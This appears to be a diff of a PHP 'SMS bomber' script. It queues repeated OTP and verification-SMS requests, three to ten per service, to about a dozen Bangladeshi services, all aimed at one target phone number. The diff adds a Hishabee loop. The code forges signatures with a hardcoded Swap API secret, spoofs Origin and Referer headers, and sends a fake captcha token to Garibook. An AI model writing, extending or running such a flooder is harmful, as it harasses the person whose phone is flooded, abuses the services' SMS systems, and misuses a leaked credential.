@@ -16,9 +16,9 @@ $phone_11 = preg_replace('/^\+?88/', '', $phone);
 if(substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;
 $phone_88 = "88" . $phone_11;
 $phone_plus88 = "+88" . $phone_11;
-$deepto_number = "+880" . substr($phone_11, -10); // +8801XXXXXXXXX ফরম্যাট
+$deepto_number = "+880" . substr($phone_11, -10);
 
-// ২. Swap API Signature (Fixed with +880 format)
+// ২. Swap API Signature
 $swap_secret = "UFNyP1f+s2bjwVAFbOBv87a142orsWLt7X/4M7pMVyE="; 
 $swap_timestamp = (string) time(); 
 $swap_signature = base64_encode(hash_hmac('sha256', $deepto_number . $swap_timestamp, $swap_secret, true));
@@ -26,75 +26,68 @@ $swap_signature = base64_encode(hash_hmac('sha256', $deepto_number . $swap_times
 $api_requests = [];
 
 // ==========================================
-// 🔴 FIXED: Swap (১০ বার)
+// 🆕 ADDED: Hishabee (৫ বার লুপ)
 // ==========================================
+for($i=1; $i<=5; $i++){
+    $api_requests[] = [
+        "name" => "hishabee_$i",
+        "url" => "https://app.hishabee.business/api/V2/otp/send?mobile_number=$phone_11&country_code=88",
+        "method" => "POST",
+        "data" => [], // প্যারামিটার ইউআরএল-এ আছে
+        "headers" => [
+            'Accept: application/json, text/plain, */*',
+            'platform: WEB',
+            'origin: https://web.hishabee.business',
+            'referer: https://web.hishabee.business/',
+            'content-length: 0'
+        ]
+    ];
+}
+
+// ==========================================
+// 🔴 FIXED SERVICES (Swap, RedX, DeeptoPlay)
+// ==========================================
+
+// Swap
 for($i=1; $i<=10; $i++){
     $api_requests[] = [
         "name" => "swap_$i",
         "url" => "https://api.swap.com.bd/api/v1/send-otp/v2",
-        "method" => "POST",
         "data" => ["phone" => $deepto_number, "timestamp" => (int)$swap_timestamp],
-        "headers" => [
-            'Content-Type: application/json',
-            'signature: ' . $swap_signature,
-            'Origin: https://swap.com.bd',
-            'Referer: https://swap.com.bd/'
-        ]
+        "headers" => ['Content-Type: application/json', 'signature: ' . $swap_signature, 'Origin: https://swap.com.bd']
     ];
 }
 
-// ==========================================
-// 🟠 FIXED: RedX (১০ বার - ব্রাউজার হেডারসহ)
-// ==========================================
+// RedX
 for($i=1; $i<=10; $i++){
     $api_requests[] = [
         "name" => "redx_$i",
         "url" => "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
-        "method" => "POST",
         "data" => ["phoneNumber" => $phone_11],
-        "headers" => [
-            'Content-Type: application/json',
-            'Origin: https://redx.com.bd',
-            'Referer: https://redx.com.bd/',
-            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        ]
+        "headers" => ['Content-Type: application/json', 'Origin: https://redx.com.bd', 'Referer: https://redx.com.bd/']
     ];
 }
 
-// ==========================================
-// 🔵 DeeptoPlay (৩ বার - অলরেডি ফিক্সড)
-// ==========================================
+// DeeptoPlay
 for($i=1; $i<=3; $i++){
     $api_requests[] = [
         "name" => "deeptoplay_$i",
         "url" => "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
-        "method" => "POST",
         "data" => ["number" => $deepto_number],
-        "headers" => [
-            'Content-Type: application/json',
-            'origin: https://www.deeptoplay.com',
-            'referer: https://www.deeptoplay.com/'
-        ]
+        "headers" => ['Content-Type: application/json', 'origin: https://www.deeptoplay.com']
     ];
 }
 
 // ==========================================
-// 🟢 বাকি সার্ভিসগুলো (Untouched)
+// 🟢 OTHER SERVICES (Untouched)
 // ==========================================
 
-// PBS
 for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"pbs_$i","url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP","data"=>["userPhone"=>$phone_11],"headers"=>['Content-Type:application/json']];
-// Garibook
 for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"garibook_$i","url"=>"https://api.garibookadmin.com/api/v4/user/login","data"=>["mobile"=>$phone_plus88,"recaptcha_token"=>"garibookcaptcha","channel"=>"web"],"headers"=>['Content-Type:application/json','Origin:https://garibook.com']];
-// Shwapno
 for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"shwapno_$i","url"=>"https://www.shwapno.com/api/auth","data"=>["phoneNumber"=>$phone_plus88],"headers"=>['Content-Type:application/json','cookie: cuid=98a49521-6662-498f-94eb-17d71974083f']];
-// Bikroy (GET)
 for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"bikroy_$i","url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11","method"=>"GET"];
-// BDTickets
 for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"bdtickets_$i","url"=>"https://api.bdtickets.com:20100/v1/auth","data"=>["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"],"headers"=>['Content-Type:application/json','Origin:https://bdtickets.com']];
-// Shikho
 for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"shikho_$i","url"=>"https://api.shikho.com/auth/v2/send/sms","data"=>["phone"=>$phone_88,"type"=>"student","auth_type"=>"signup"],"headers"=>['Content-Type:application/json','Origin:https://shikho.com']];
-// Iqra (GET)
 for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"iqra_$i","url"=>"https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11,"method"=>"GET","headers"=>['Origin:https://iqra-live.com']];
 
 // ==========================================
